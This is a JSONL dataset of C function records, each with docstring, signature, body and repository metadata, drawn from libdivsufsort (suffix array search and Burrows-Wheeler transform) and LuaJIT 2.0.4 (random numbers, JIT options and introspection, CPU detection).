{"docstring": "/* Search for the character c in the string T. */\n", "func_signal": "saidx_t\nsa_simplesearch(const sauchar_t *T, saidx_t Tsize,\n                const saidx_t *SA, saidx_t SAsize,\n                saint_t c, saidx_t *idx)", "code": "{\n  saidx_t size, lsize, rsize, half;\n  saidx_t i, j, k, p;\n  saint_t r;\n\n  if(idx != NULL) { *idx = -1; }\n  if((T == NULL) || (SA == NULL) || (Tsize < 0) || (SAsize < 0)) { return -1; }\n  if((Tsize == 0) || (SAsize == 0)) { return 0; }\n\n  for(i = j = k = 0, size = SAsize, half = size >> 1;\n      0 < size;\n      size = half, half >>= 1) {\n    p = SA[i + half];\n    r = (p < Tsize) ? T[p] - c : -1;\n    if(r < 0) {\n      i += half + 1;\n      half -= (size & 1) ^ 1;\n    } else if(r == 0) {\n      lsize = half, j = i, rsize = size - half - 1, k = i + half + 1;\n\n      /* left part */\n      for(half = lsize >> 1;\n          0 < lsize;\n          lsize = half, half >>= 1) {\n        p = SA[j + half];\n        r = (p < Tsize) ? T[p] - c : -1;\n        if(r < 0) {\n          j += half + 1;\n          half -= (lsize & 1) ^ 1;\n        }\n      }\n\n      /* right part */\n      for(half = rsize >> 1;\n          0 < rsize;\n          rsize = half, half >>= 1) {\n        p = SA[k + half];\n        r = (p < Tsize) ? T[p] - c : -1;\n        if(r <= 0) {\n          k += half + 1;\n          half -= (rsize & 1) ^ 1;\n        }\n      }\n\n      break;\n    }\n  }\n\n  if(idx != NULL) { *idx = (0 < (k - j)) ? j : i; }\n  return k - j;\n}", "path": "lib\\utils.c", "repo_name": "y-256/libdivsufsort", "stars": 329, "license": "mit", "language": "c", "size": 264}
{"docstring": "/* Returns the pivot element. */\n", "func_signal": "static INLINE\nsaidx_t *\nss_pivot(const sauchar_t *Td, const saidx_t *PA, saidx_t *first, saidx_t *last)", "code": "{\n  saidx_t *middle;\n  saidx_t t;\n\n  t = last - first;\n  middle = first + t / 2;\n\n  if(t <= 512) {\n    if(t <= 32) {\n      return ss_median3(Td, PA, first, middle, last - 1);\n    } else {\n      t >>= 2;\n      return ss_median5(Td, PA, first, first + t, middle, last - 1 - t, last - 1);\n    }\n  }\n  t >>= 3;\n  first  = ss_median3(Td, PA, first, first + t, first + (t << 1));\n  middle = ss_median3(Td, PA, middle - t, middle, middle + t);\n  last   = ss_median3(Td, PA, last - 1 - (t << 1), last - 1 - t, last - 1);\n  return ss_median3(Td, PA, first, middle, last);\n}", "path": "lib\\sssort.c", "repo_name": "y-256/libdivsufsort", "stars": 329, "license": "mit", "language": "c", "size": 264}
{"docstring": "/* Search for the pattern P in the string T. */\n", "func_signal": "saidx_t\nsa_search(const sauchar_t *T, saidx_t Tsize,\n          const sauchar_t *P, saidx_t Psize,\n          const saidx_t *SA, saidx_t SAsize,\n          saidx_t *idx)", "code": "{\n  saidx_t size, lsize, rsize, half;\n  saidx_t match, lmatch, rmatch;\n  saidx_t llmatch, lrmatch, rlmatch, rrmatch;\n  saidx_t i, j, k;\n  saint_t r;\n\n  if(idx != NULL) { *idx = -1; }\n  if((T == NULL) || (P == NULL) || (SA == NULL) ||\n     (Tsize < 0) || (Psize < 0) || (SAsize < 0)) { return -1; }\n  if((Tsize == 0) || (SAsize == 0)) { return 0; }\n  if(Psize == 0) { if(idx != NULL) { *idx = 0; } return SAsize; }\n\n  for(i = j = k = 0, lmatch = rmatch = 0, size = SAsize, half = size >> 1;\n      0 < size;\n      size = half, half >>= 1) {\n    match = MIN(lmatch, rmatch);\n    r = _compare(T, Tsize, P, Psize, SA[i + half], &match);\n    if(r < 0) {\n      i += half + 1;\n      half -= (size & 1) ^ 1;\n      lmatch = match;\n    } else if(r > 0) {\n      rmatch = match;\n    } else {\n      lsize = half, j = i, rsize = size - half - 1, k = i + half + 1;\n\n      /* left part */\n      for(llmatch = lmatch, lrmatch = match, half = lsize >> 1;\n          0 < lsize;\n          lsize = half, half >>= 1) {\n        lmatch = MIN(llmatch, lrmatch);\n        r = _compare(T, Tsize, P, Psize, SA[j + half], &lmatch);\n        if(r < 0) {\n          j += half + 1;\n          half -= (lsize & 1) ^ 1;\n          llmatch = lmatch;\n        } else {\n          lrmatch = lmatch;\n        }\n      }\n\n      /* right part */\n      for(rlmatch = match, rrmatch = rmatch, half = rsize >> 1;\n          0 < rsize;\n          rsize = half, half >>= 1) {\n        rmatch = MIN(rlmatch, rrmatch);\n        r = _compare(T, Tsize, P, Psize, SA[k + half], &rmatch);\n        if(r <= 0) {\n          k += half + 1;\n          half -= (rsize & 1) ^ 1;\n          rlmatch = rmatch;\n        } else {\n          rrmatch = rmatch;\n        }\n      }\n\n      break;\n    }\n  }\n\n  if(idx != NULL) { *idx = (0 < (k - j)) ? j : i; }\n  return k - j;\n}", "path": "lib\\utils.c", "repo_name": "y-256/libdivsufsort", "stars": 329, "license": "mit", "language": "c", "size": 264}
{"docstring": "/* Inverse Burrows-Wheeler transform. */\n", "func_signal": "saint_t\ninverse_bw_transform(const sauchar_t *T, sauchar_t *U, saidx_t *A,\n                     saidx_t n, saidx_t idx)", "code": "{\n  saidx_t C[ALPHABET_SIZE];\n  sauchar_t D[ALPHABET_SIZE];\n  saidx_t *B;\n  saidx_t i, p;\n  saint_t c, d;\n\n  /* Check arguments. */\n  if((T == NULL) || (U == NULL) || (n < 0) || (idx < 0) ||\n     (n < idx) || ((0 < n) && (idx == 0))) {\n    return -1;\n  }\n  if(n <= 1) { return 0; }\n\n  if((B = A) == NULL) {\n    /* Allocate n*sizeof(saidx_t) bytes of memory. */\n    if((B = (saidx_t *)malloc((size_t)n * sizeof(saidx_t))) == NULL) { return -2; }\n  }\n\n  /* Inverse BW transform. */\n  for(c = 0; c < ALPHABET_SIZE; ++c) { C[c] = 0; }\n  for(i = 0; i < n; ++i) { ++C[T[i]]; }\n  for(c = 0, d = 0, i = 0; c < ALPHABET_SIZE; ++c) {\n    p = C[c];\n    if(0 < p) {\n      C[c] = i;\n      D[d++] = (sauchar_t)c;\n      i += p;\n    }\n  }\n  for(i = 0; i < idx; ++i) { B[C[T[i]]++] = i; }\n  for( ; i < n; ++i)       { B[C[T[i]]++] = i + 1; }\n  for(c = 0; c < d; ++c) { C[c] = C[D[c]]; }\n  for(i = 0, p = idx; i < n; ++i) {\n    U[i] = D[binarysearch_lower(C, d, p)];\n    p = B[p - 1];\n  }\n\n  if(A == NULL) {\n    /* Deallocate memory. */\n    free(B);\n  }\n\n  return 0;\n}", "path": "lib\\utils.c", "repo_name": "y-256/libdivsufsort", "stars": 329, "license": "mit", "language": "c", "size": 264}
{"docstring": "/*---------------------------------------------------------------------------*/\n", "func_signal": "static INLINE\nvoid\ntr_partition(const saidx_t *ISAd,\n             saidx_t *first, saidx_t *middle, saidx_t *last,\n             saidx_t **pa, saidx_t **pb, saidx_t v)", "code": "{\n  saidx_t *a, *b, *c, *d, *e, *f;\n  saidx_t t, s;\n  saidx_t x = 0;\n\n  for(b = middle - 1; (++b < last) && ((x = ISAd[*b]) == v);) { }\n  if(((a = b) < last) && (x < v)) {\n    for(; (++b < last) && ((x = ISAd[*b]) <= v);) {\n      if(x == v) { SWAP(*b, *a); ++a; }\n    }\n  }\n  for(c = last; (b < --c) && ((x = ISAd[*c]) == v);) { }\n  if((b < (d = c)) && (x > v)) {\n    for(; (b < --c) && ((x = ISAd[*c]) >= v);) {\n      if(x == v) { SWAP(*c, *d); --d; }\n    }\n  }\n  for(; b < c;) {\n    SWAP(*b, *c);\n    for(; (++b < c) && ((x = ISAd[*b]) <= v);) {\n      if(x == v) { SWAP(*b, *a); ++a; }\n    }\n    for(; (b < --c) && ((x = ISAd[*c]) >= v);) {\n      if(x == v) { SWAP(*c, *d); --d; }\n    }\n  }\n\n  if(a <= d) {\n    c = b - 1;\n    if((s = a - first) > (t = b - a)) { s = t; }\n    for(e = first, f = b - s; 0 < s; --s, ++e, ++f) { SWAP(*e, *f); }\n    if((s = d - c) > (t = last - d - 1)) { s = t; }\n    for(e = b, f = last - s; 0 < s; --s, ++e, ++f) { SWAP(*e, *f); }\n    first += (b - a), last -= (d - c);\n  }\n  *pa = first, *pb = last;\n}", "path": "lib\\trsort.c", "repo_name": "y-256/libdivsufsort", "stars": 329, "license": "mit", "language": "c", "size": 264}
{"docstring": "/* Burrows-Wheeler transform. */\n", "func_signal": "saint_t\nbw_transform(const sauchar_t *T, sauchar_t *U, saidx_t *SA,\n             saidx_t n, saidx_t *idx)", "code": "{\n  saidx_t *A, i, j, p, t;\n  saint_t c;\n\n  /* Check arguments. */\n  if((T == NULL) || (U == NULL) || (n < 0) || (idx == NULL)) { return -1; }\n  if(n <= 1) {\n    if(n == 1) { U[0] = T[0]; }\n    *idx = n;\n    return 0;\n  }\n\n  if((A = SA) == NULL) {\n    i = divbwt(T, U, NULL, n);\n    if(0 <= i) { *idx = i; i = 0; }\n    return (saint_t)i;\n  }\n\n  /* BW transform. */\n  if(T == U) {\n    t = n;\n    for(i = 0, j = 0; i < n; ++i) {\n      p = t - 1;\n      t = A[i];\n      if(0 <= p) {\n        c = T[j];\n        U[j] = (j <= p) ? T[p] : (sauchar_t)A[p];\n        A[j] = c;\n        j++;\n      } else {\n        *idx = i;\n      }\n    }\n    p = t - 1;\n    if(0 <= p) {\n      c = T[j];\n      U[j] = (j <= p) ? T[p] : (sauchar_t)A[p];\n      A[j] = c;\n    } else {\n      *idx = i;\n    }\n  } else {\n    U[0] = T[n - 1];\n    for(i = 0; A[i] != 0; ++i) { U[i + 1] = T[A[i] - 1]; }\n    *idx = i + 1;\n    for(++i; i < n; ++i) { U[i] = T[A[i] - 1]; }\n  }\n\n  if(SA == NULL) {\n    /* Deallocate memory. */\n    free(A);\n  }\n\n  return 0;\n}", "path": "lib\\utils.c", "repo_name": "y-256/libdivsufsort", "stars": 329, "license": "mit", "language": "c", "size": 264}
{"docstring": "/*---------------------------------------------------------------------------*/\n", "func_signal": "static\nvoid\nss_inplacemerge(const sauchar_t *T, const saidx_t *PA,\n                saidx_t *first, saidx_t *middle, saidx_t *last,\n                saidx_t depth)", "code": "{\n  const saidx_t *p;\n  saidx_t *a, *b;\n  saidx_t len, half;\n  saint_t q, r;\n  saint_t x;\n\n  for(;;) {\n    if(*(last - 1) < 0) { x = 1; p = PA + ~*(last - 1); }\n    else                { x = 0; p = PA +  *(last - 1); }\n    for(a = first, len = middle - first, half = len >> 1, r = -1;\n        0 < len;\n        len = half, half >>= 1) {\n      b = a + half;\n      q = ss_compare(T, PA + ((0 <= *b) ? *b : ~*b), p, depth);\n      if(q < 0) {\n        a = b + 1;\n        half -= (len & 1) ^ 1;\n      } else {\n        r = q;\n      }\n    }\n    if(a < middle) {\n      if(r == 0) { *a = ~*a; }\n      ss_rotate(a, middle, last);\n      last -= middle - a;\n      middle = a;\n      if(first == middle) { break; }\n    }\n    --last;\n    if(x != 0) { while(*--last < 0) { } }\n    if(middle == last) { break; }\n  }\n}", "path": "lib\\sssort.c", "repo_name": "y-256/libdivsufsort", "stars": 329, "license": "mit", "language": "c", "size": 264}
{"docstring": "/* Upvalue holds userdata with RandomState. */\n", "func_signal": "LJLIB_CF(math_random)\t\tLJLIB_REC(.)", "code": "{\n  int n = (int)(L->top - L->base);\n  RandomState *rs = (RandomState *)(uddata(udataV(lj_lib_upvalue(L, 1))));\n  U64double u;\n  double d;\n  if (LJ_UNLIKELY(!rs->valid)) random_init(rs, 0.0);\n  u.u64 = lj_math_random_step(rs);\n  d = u.d - 1.0;\n  if (n > 0) {\n#if LJ_DUALNUM\n    int isint = 1;\n    double r1;\n    lj_lib_checknumber(L, 1);\n    if (tvisint(L->base)) {\n      r1 = (lua_Number)intV(L->base);\n    } else {\n      isint = 0;\n      r1 = numV(L->base);\n    }\n#else\n    double r1 = lj_lib_checknum(L, 1);\n#endif\n    if (n == 1) {\n      d = lj_vm_floor(d*r1) + 1.0;  /* d is an int in range [1, r1] */\n    } else {\n#if LJ_DUALNUM\n      double r2;\n      lj_lib_checknumber(L, 2);\n      if (tvisint(L->base+1)) {\n\tr2 = (lua_Number)intV(L->base+1);\n      } else {\n\tisint = 0;\n\tr2 = numV(L->base+1);\n      }\n#else\n      double r2 = lj_lib_checknum(L, 2);\n#endif\n      d = lj_vm_floor(d*(r2-r1+1.0)) + r1;  /* d is an int in range [r1, r2] */\n    }\n#if LJ_DUALNUM\n    if (isint) {\n      setintV(L->top-1, lj_num2int(d));\n      return 1;\n    }\n#endif\n  }  /* else: d is a double in range [0, 1] */\n  setnumV(L->top++, d);\n  return 1;\n}", "path": "LuaJIT-2.0.4\\src\\lib_math.c", "repo_name": "jvburnes/node9", "stars": 393, "license": "mit", "language": "c", "size": 12783}
{"docstring": "/* jit.opt.start(flags...) */\n", "func_signal": "LJLIB_CF(jit_opt_start)", "code": "{\n  jit_State *J = L2J(L);\n  int nargs = (int)(L->top - L->base);\n  if (nargs == 0) {\n    J->flags = (J->flags & ~JIT_F_OPT_MASK) | JIT_F_OPT_DEFAULT;\n  } else {\n    int i;\n    for (i = 1; i <= nargs; i++) {\n      const char *str = strdata(lj_lib_checkstr(L, i));\n      if (!jitopt_level(J, str) &&\n\t  !jitopt_flag(J, str) &&\n\t  !jitopt_param(J, str))\n\tlj_err_callerv(L, LJ_ERR_JITOPT, str);\n    }\n  }\n  return 0;\n}", "path": "LuaJIT-2.0.4\\src\\lib_jit.c", "repo_name": "jvburnes/node9", "stars": 393, "license": "mit", "language": "c", "size": 12783}
{"docstring": "/* local info = jit.util.traceinfo(tr) */\n", "func_signal": "LJLIB_CF(jit_util_traceinfo)", "code": "{\n  GCtrace *T = jit_checktrace(L);\n  if (T) {\n    GCtab *t;\n    lua_createtable(L, 0, 8);  /* Increment hash size if fields are added. */\n    t = tabV(L->top-1);\n    setintfield(L, t, \"nins\", (int32_t)T->nins - REF_BIAS - 1);\n    setintfield(L, t, \"nk\", REF_BIAS - (int32_t)T->nk);\n    setintfield(L, t, \"link\", T->link);\n    setintfield(L, t, \"nexit\", T->nsnap);\n    setstrV(L, L->top++, lj_str_newz(L, jit_trlinkname[T->linktype]));\n    lua_setfield(L, -2, \"linktype\");\n    /* There are many more fields. Add them only when needed. */\n    return 1;\n  }\n  return 0;\n}", "path": "LuaJIT-2.0.4\\src\\lib_jit.c", "repo_name": "jvburnes/node9", "stars": 393, "license": "mit", "language": "c", "size": 12783}
{"docstring": "/* Arch-dependent CPU detection. */\n", "func_signal": "static uint32_t jit_cpudetect(lua_State *L)", "code": "{\n  uint32_t flags = 0;\n#if LJ_TARGET_X86ORX64\n  uint32_t vendor[4];\n  uint32_t features[4];\n  if (lj_vm_cpuid(0, vendor) && lj_vm_cpuid(1, features)) {\n#if !LJ_HASJIT\n#define JIT_F_CMOV\t1\n#define JIT_F_SSE2\t2\n#endif\n    flags |= ((features[3] >> 15)&1) * JIT_F_CMOV;\n    flags |= ((features[3] >> 26)&1) * JIT_F_SSE2;\n#if LJ_HASJIT\n    flags |= ((features[2] >> 0)&1) * JIT_F_SSE3;\n    flags |= ((features[2] >> 19)&1) * JIT_F_SSE4_1;\n    if (vendor[2] == 0x6c65746e) {  /* Intel. */\n      if ((features[0] & 0x0ff00f00) == 0x00000f00)  /* P4. */\n\tflags |= JIT_F_P4;  /* Currently unused. */\n      else if ((features[0] & 0x0fff0ff0) == 0x000106c0)  /* Atom. */\n\tflags |= JIT_F_LEA_AGU;\n    } else if (vendor[2] == 0x444d4163) {  /* AMD. */\n      uint32_t fam = (features[0] & 0x0ff00f00);\n      if (fam == 0x00000f00)  /* K8. */\n\tflags |= JIT_F_SPLIT_XMM;\n      if (fam >= 0x00000f00)  /* K8, K10. */\n\tflags |= JIT_F_PREFER_IMUL;\n    }\n#endif\n  }\n  /* Check for required instruction set support on x86 (unnecessary on x64). */\n#if LJ_TARGET_X86\n#if !defined(LUAJIT_CPU_NOCMOV)\n  if (!(flags & JIT_F_CMOV))\n    luaL_error(L, \"CPU not supported\");\n#endif\n#if defined(LUAJIT_CPU_SSE2)\n  if (!(flags & JIT_F_SSE2))\n    luaL_error(L, \"CPU does not support SSE2 (recompile without -DLUAJIT_CPU_SSE2)\");\n#endif\n#endif\n#elif LJ_TARGET_ARM\n#if LJ_HASJIT\n  int ver = LJ_ARCH_VERSION;  /* Compile-time ARM CPU detection. */\n#if LJ_TARGET_LINUX\n  if (ver < 70) {  /* Runtime ARM CPU detection. */\n    struct utsname ut;\n    uname(&ut);\n    if (strncmp(ut.machine, \"armv\", 4) == 0) {\n      if (ut.machine[4] >= '7')\n\tver = 70;\n      else if (ut.machine[4] == '6')\n\tver = 60;\n    }\n  }\n#endif\n  flags |= ver >= 70 ? JIT_F_ARMV7 :\n\t   ver >= 61 ? JIT_F_ARMV6T2_ :\n\t   ver >= 60 ? JIT_F_ARMV6_ : 0;\n  flags |= LJ_ARCH_HASFPU == 0 ? 0 : ver >= 70 ? JIT_F_VFPV3 : JIT_F_VFPV2;\n#endif\n#elif LJ_TARGET_PPC\n#if LJ_HASJIT\n#if LJ_ARCH_SQRT\n  flags |= JIT_F_SQRT;\n#endif\n#if LJ_ARCH_ROUND\n  flags |= JIT_F_ROUND;\n#endif\n#endif\n#elif LJ_TARGET_PPCSPE\n  /* Nothing to do. */\n#elif LJ_TARGET_MIPS\n#if LJ_HASJIT\n  /* Compile-time MIPS CPU detection. */\n#if LJ_ARCH_VERSION >= 20\n  flags |= JIT_F_MIPS32R2;\n#endif\n  /* Runtime MIPS CPU detection. */\n#if defined(__GNUC__)\n  if (!(flags & JIT_F_MIPS32R2)) {\n    int x;\n    /* On MIPS32R1 rotr is treated as srl. rotr r2,r2,1 -> srl r2,r2,1. */\n    __asm__(\"li $2, 1\\n\\t.long 0x00221042\\n\\tmove %0, $2\" : \"=r\"(x) : : \"$2\");\n    if (x) flags |= JIT_F_MIPS32R2;  /* Either 0x80000000 (R2) or 0 (R1). */\n  }\n#endif\n#endif\n#else\n#error \"Missing CPU detection for this architecture\"\n#endif\n  UNUSED(L);\n  return flags;\n}", "path": "LuaJIT-2.0.4\\src\\lib_jit.c", "repo_name": "jvburnes/node9", "stars": 393, "license": "mit", "language": "c", "size": 12783}
{"docstring": "/* Initialize JIT compiler. */\n", "func_signal": "static void jit_init(lua_State *L)", "code": "{\n  uint32_t flags = jit_cpudetect(L);\n#if LJ_HASJIT\n  jit_State *J = L2J(L);\n#if LJ_TARGET_X86\n  /* Silently turn off the JIT compiler on CPUs without SSE2. */\n  if ((flags & JIT_F_SSE2))\n#endif\n    J->flags = flags | JIT_F_ON | JIT_F_OPT_DEFAULT;\n  memcpy(J->param, jit_param_default, sizeof(J->param));\n  lj_dispatch_update(G(L));\n#else\n  UNUSED(flags);\n#endif\n}", "path": "LuaJIT-2.0.4\\src\\lib_jit.c", "repo_name": "jvburnes/node9", "stars": 393, "license": "mit", "language": "c", "size": 12783}
{"docstring": "/* local k = jit.util.funck(func, idx) */\n", "func_signal": "LJLIB_CF(jit_util_funck)", "code": "{\n  GCproto *pt = check_Lproto(L, 0);\n  ptrdiff_t idx = (ptrdiff_t)lj_lib_checkint(L, 2);\n  if (idx >= 0) {\n    if (idx < (ptrdiff_t)pt->sizekn) {\n      copyTV(L, L->top-1, proto_knumtv(pt, idx));\n      return 1;\n    }\n  } else {\n    if (~idx < (ptrdiff_t)pt->sizekgc) {\n      GCobj *gc = proto_kgc(pt, idx);\n      setgcV(L, L->top-1, gc, ~gc->gch.gct);\n      return 1;\n    }\n  }\n  return 0;\n}", "path": "LuaJIT-2.0.4\\src\\lib_jit.c", "repo_name": "jvburnes/node9", "stars": 393, "license": "mit", "language": "c", "size": 12783}
{"docstring": "/* PRNG initialization function. */\n", "func_signal": "static void random_init(RandomState *rs, double d)", "code": "{\n  uint32_t r = 0x11090601;  /* 64-k[i] as four 8 bit constants. */\n  int i;\n  for (i = 0; i < 4; i++) {\n    U64double u;\n    uint32_t m = 1u << (r&255);\n    r >>= 8;\n    u.d = d = d * 3.14159265358979323846 + 2.7182818284590452354;\n    if (u.u64 < m) u.u64 += m;  /* Ensure k[i] MSB of gen[i] are non-zero. */\n    rs->gen[i] = u.u64;\n  }\n  rs->valid = 1;\n  for (i = 0; i < 10; i++)\n    lj_math_random_step(rs);\n}", "path": "LuaJIT-2.0.4\\src\\lib_math.c", "repo_name": "jvburnes/node9", "stars": 393, "license": "mit", "language": "c", "size": 12783}
{"docstring": "/* local snap = jit.util.tracesnap(tr, sn) */\n", "func_signal": "LJLIB_CF(jit_util_tracesnap)", "code": "{\n  GCtrace *T = jit_checktrace(L);\n  SnapNo sn = (SnapNo)lj_lib_checkint(L, 2);\n  if (T && sn < T->nsnap) {\n    SnapShot *snap = &T->snap[sn];\n    SnapEntry *map = &T->snapmap[snap->mapofs];\n    MSize n, nent = snap->nent;\n    GCtab *t;\n    lua_createtable(L, nent+2, 0);\n    t = tabV(L->top-1);\n    setintV(lj_tab_setint(L, t, 0), (int32_t)snap->ref - REF_BIAS);\n    setintV(lj_tab_setint(L, t, 1), (int32_t)snap->nslots);\n    for (n = 0; n < nent; n++)\n      setintV(lj_tab_setint(L, t, (int32_t)(n+2)), (int32_t)map[n]);\n    setintV(lj_tab_setint(L, t, (int32_t)(nent+2)), (int32_t)SNAP(255, 0, 0));\n    return 1;\n  }\n  return 0;\n}", "path": "LuaJIT-2.0.4\\src\\lib_jit.c", "repo_name": "jvburnes/node9", "stars": 393, "license": "mit", "language": "c", "size": 12783}
{"docstring": "/* local addr = jit.util.ircalladdr(idx) */\n", "func_signal": "LJLIB_CF(jit_util_ircalladdr)", "code": "{\n  uint32_t idx = (uint32_t)lj_lib_checkint(L, 1);\n  if (idx < IRCALL__MAX) {\n    setintptrV(L->top-1, (intptr_t)(void *)lj_ir_callinfo[idx].func);\n    return 1;\n  }\n  return 0;\n}", "path": "LuaJIT-2.0.4\\src\\lib_jit.c", "repo_name": "jvburnes/node9", "stars": 393, "license": "mit", "language": "c", "size": 12783}
{"docstring": "/* Check trace argument. Must not throw for non-existent trace numbers. */\n", "func_signal": "static GCtrace *jit_checktrace(lua_State *L)", "code": "{\n  TraceNo tr = (TraceNo)lj_lib_checkint(L, 1);\n  jit_State *J = L2J(L);\n  if (tr > 0 && tr < J->sizetrace)\n    return traceref(J, tr);\n  return NULL;\n}", "path": "LuaJIT-2.0.4\\src\\lib_jit.c", "repo_name": "jvburnes/node9", "stars": 393, "license": "mit", "language": "c", "size": 12783}
{"docstring": "/* local addr = jit.util.traceexitstub([tr,] exitno) */\n", "func_signal": "LJLIB_CF(jit_util_traceexitstub)", "code": "{\n#ifdef EXITSTUBS_PER_GROUP\n  ExitNo exitno = (ExitNo)lj_lib_checkint(L, 1);\n  jit_State *J = L2J(L);\n  if (exitno < EXITSTUBS_PER_GROUP*LJ_MAX_EXITSTUBGR) {\n    setintptrV(L->top-1, (intptr_t)(void *)exitstub_addr(J, exitno));\n    return 1;\n  }\n#else\n  if (L->top > L->base+1) {  /* Don't throw for one-argument variant. */\n    GCtrace *T = jit_checktrace(L);\n    ExitNo exitno = (ExitNo)lj_lib_checkint(L, 2);\n    ExitNo maxexit = T->root ? T->nsnap+1 : T->nsnap;\n    if (T && T->mcode != NULL && exitno < maxexit) {\n      setintptrV(L->top-1, (intptr_t)(void *)exitstub_trace_addr(T, exitno));\n      return 1;\n    }\n  }\n#endif\n  return 0;\n}", "path": "LuaJIT-2.0.4\\src\\lib_jit.c", "repo_name": "jvburnes/node9", "stars": 393, "license": "mit", "language": "c", "size": 12783}
{"docstring": "/* Parse optimization parameter. */\n", "func_signal": "static int jitopt_param(jit_State *J, const char *str)", "code": "{\n  const char *lst = JIT_P_STRING;\n  int i;\n  for (i = 0; i < JIT_P__MAX; i++) {\n    size_t len = *(const uint8_t *)lst;\n    lua_assert(len != 0);\n    if (strncmp(str, lst+1, len) == 0 && str[len] == '=') {\n      int32_t n = 0;\n      const char *p = &str[len+1];\n      while (*p >= '0' && *p <= '9')\n\tn = n*10 + (*p++ - '0');\n      if (*p) return 0;  /* Malformed number. */\n      J->param[i] = n;\n      if (i == JIT_P_hotloop)\n\tlj_dispatch_init_hotcount(J2G(J));\n      return 1;  /* Ok. */\n    }\n    lst += 1+len;\n  }\n  return 0;  /* No match. */\n}", "path": "LuaJIT-2.0.4\\src\\lib_jit.c", "repo_name": "jvburnes/node9", "stars": 393, "license": "mit", "language": "c", "size": 12783}
{"docstring": "/* local mcode, addr, loop = jit.util.tracemc(tr) */\n", "func_signal": "LJLIB_CF(jit_util_tracemc)", "code": "{\n  GCtrace *T = jit_checktrace(L);\n  if (T && T->mcode != NULL) {\n    setstrV(L, L->top-1, lj_str_new(L, (const char *)T->mcode, T->szmcode));\n    setintptrV(L->top++, (intptr_t)(void *)T->mcode);\n    setintV(L->top++, T->mcloop);\n    return 3;\n  }\n  return 0;\n}", "path": "LuaJIT-2.0.4\\src\\lib_jit.c", "repo_name": "jvburnes/node9", "stars": 393, "license": "mit", "language": "c", "size": 12783}
{"docstring": "/* local m, ot, op1, op2, prev = jit.util.traceir(tr, idx) */\n", "func_signal": "LJLIB_CF(jit_util_traceir)", "code": "{\n  GCtrace *T = jit_checktrace(L);\n  IRRef ref = (IRRef)lj_lib_checkint(L, 2) + REF_BIAS;\n  if (T && ref >= REF_BIAS && ref < T->nins) {\n    IRIns *ir = &T->ir[ref];\n    int32_t m = lj_ir_mode[ir->o];\n    setintV(L->top-2, m);\n    setintV(L->top-1, ir->ot);\n    setintV(L->top++, (int32_t)ir->op1 - (irm_op1(m)==IRMref ? REF_BIAS : 0));\n    setintV(L->top++, (int32_t)ir->op2 - (irm_op2(m)==IRMref ? REF_BIAS : 0));\n    setintV(L->top++, ir->prev);\n    return 5;\n  }\n  return 0;\n}", "path": "LuaJIT-2.0.4\\src\\lib_jit.c", "repo_name": "jvburnes/node9", "stars": 393, "license": "mit", "language": "c", "size": 12783}
{"docstring": "/* local name = jit.util.funcuvname(func, idx) */\n", "func_signal": "LJLIB_CF(jit_util_funcuvname)", "code": "{\n  GCproto *pt = check_Lproto(L, 0);\n  uint32_t idx = (uint32_t)lj_lib_checkint(L, 2);\n  if (idx < pt->sizeuv) {\n    setstrV(L, L->top-1, lj_str_newz(L, lj_debug_uvname(pt, idx)));\n    return 1;\n  }\n  return 0;\n}", "path": "LuaJIT-2.0.4\\src\\lib_jit.c", "repo_name": "jvburnes/node9", "stars": 393, "license": "mit", "language": "c", "size": 12783}
{"docstring": "/* Upvalue holds userdata with RandomState. */\n", "func_signal": "LJLIB_CF(math_randomseed)", "code": "{\n  RandomState *rs = (RandomState *)(uddata(udataV(lj_lib_upvalue(L, 1))));\n  random_init(rs, lj_lib_checknum(L, 1));\n  return 0;\n}", "path": "LuaJIT-2.0.4\\src\\lib_math.c", "repo_name": "jvburnes/node9", "stars": 393, "license": "mit", "language": "c", "size": 12783}
{"docstring": "/* local k, t [, slot] = jit.util.tracek(tr, idx) */\n", "func_signal": "LJLIB_CF(jit_util_tracek)", "code": "{\n  GCtrace *T = jit_checktrace(L);\n  IRRef ref = (IRRef)lj_lib_checkint(L, 2) + REF_BIAS;\n  if (T && ref >= T->nk && ref < REF_BIAS) {\n    IRIns *ir = &T->ir[ref];\n    int32_t slot = -1;\n    if (ir->o == IR_KSLOT) {\n      slot = ir->op2;\n      ir = &T->ir[ir->op1];\n    }\n    lj_ir_kvalue(L, L->top-2, ir);\n    setintV(L->top-1, (int32_t)irt_type(ir->t));\n    if (slot == -1)\n      return 2;\n    setintV(L->top++, slot);\n    return 3;\n  }\n  return 0;\n}", "path": "LuaJIT-2.0.4\\src\\lib_jit.c", "repo_name": "jvburnes/node9", "stars": 393, "license": "mit", "language": "c", "size": 12783}
{"docstring": "/* local info = jit.util.funcinfo(func [,pc]) */\n", "func_signal": "LJLIB_CF(jit_util_funcinfo)", "code": "{\n  GCproto *pt = check_Lproto(L, 1);\n  if (pt) {\n    BCPos pc = (BCPos)lj_lib_optint(L, 2, 0);\n    GCtab *t;\n    lua_createtable(L, 0, 16);  /* Increment hash size if fields are added. */\n    t = tabV(L->top-1);\n    setintfield(L, t, \"linedefined\", pt->firstline);\n    setintfield(L, t, \"lastlinedefined\", pt->firstline + pt->numline);\n    setintfield(L, t, \"stackslots\", pt->framesize);\n    setintfield(L, t, \"params\", pt->numparams);\n    setintfield(L, t, \"bytecodes\", (int32_t)pt->sizebc);\n    setintfield(L, t, \"gcconsts\", (int32_t)pt->sizekgc);\n    setintfield(L, t, \"nconsts\", (int32_t)pt->sizekn);\n    setintfield(L, t, \"upvalues\", (int32_t)pt->sizeuv);\n    if (pc < pt->sizebc)\n      setintfield(L, t, \"currentline\", lj_debug_line(pt, pc));\n    lua_pushboolean(L, (pt->flags & PROTO_VARARG));\n    lua_setfield(L, -2, \"isvararg\");\n    lua_pushboolean(L, (pt->flags & PROTO_CHILD));\n    lua_setfield(L, -2, \"children\");\n    setstrV(L, L->top++, proto_chunkname(pt));\n    lua_setfield(L, -2, \"source\");\n    lj_debug_pushloc(L, pt, pc);\n    lua_setfield(L, -2, \"loc\");\n  } else {\n    GCfunc *fn = funcV(L->base);\n    GCtab *t;\n    lua_createtable(L, 0, 4);  /* Increment hash size if fields are added. */\n    t = tabV(L->top-1);\n    if (!iscfunc(fn))\n      setintfield(L, t, \"ffid\", fn->c.ffid);\n    setintptrV(lj_tab_setstr(L, t, lj_str_newlit(L, \"addr\")),\n\t       (intptr_t)(void *)fn->c.f);\n    setintfield(L, t, \"upvalues\", fn->c.nupvalues);\n  }\n  return 1;\n}", "path": "LuaJIT-2.0.4\\src\\lib_jit.c", "repo_name": "jvburnes/node9", "stars": 393, "license": "mit", "language": "c", "size": 12783}
